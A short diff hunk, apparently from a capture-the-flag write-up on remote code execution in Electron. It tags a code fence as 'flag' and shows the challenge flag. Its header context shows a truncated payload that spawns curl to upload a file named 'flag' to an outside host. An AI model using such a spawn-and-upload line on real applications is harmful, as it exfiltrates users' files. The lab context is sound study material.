@@ -117,6 +117,6 @@ cp2.spawn({ shell: true, file: 'curl', args: ['curl', '-F', 'flag=@flag', 'https
 }">
 ```
 
-```
+```flag
 FLAG{r3m07e_c0d3_execu710n_v1a_3l3c7r0n}
 ```
